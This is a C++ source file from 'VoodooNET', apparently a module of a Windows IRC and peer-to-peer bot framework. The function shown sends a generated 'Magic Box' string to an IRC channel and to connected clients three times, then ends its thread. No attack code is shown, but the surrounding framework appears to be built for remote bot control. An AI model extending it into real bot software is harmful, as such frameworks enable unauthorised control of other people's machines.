/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include "includes.h"

struct par
{
	int a;
	int b;
	int c;
	int d;
	char test[25];
	char desc[1024];
};
DWORD WINAPI TestOneThread(LPVOID param)
{
	int i = 0;
	NTHREAD testonethread = *((NTHREAD*)param);
	NTHREAD* testonethreads = (NTHREAD*)param;
	par* params = (par*)param;

	for (int i = 0; i <= 2; i++)
	{
#ifndef NO_ASTRO
		g_cVoodoo->m_cAstro.sendmsg("04[15Magic Box04]:00 %s", g_cVoodoo->m_cMagic.cGenerate());
#endif
#ifndef NO_P2P
		g_cVoodoo->m_cServer.SendToClients("[cMagic]: %s", g_cVoodoo->m_cMagic.cGenerate());
#endif

		Sleep(1000);
	}
	g_cVoodoo->m_cThread.ClearThread(testonethread.threadnum);

	ExitThread(0);
}
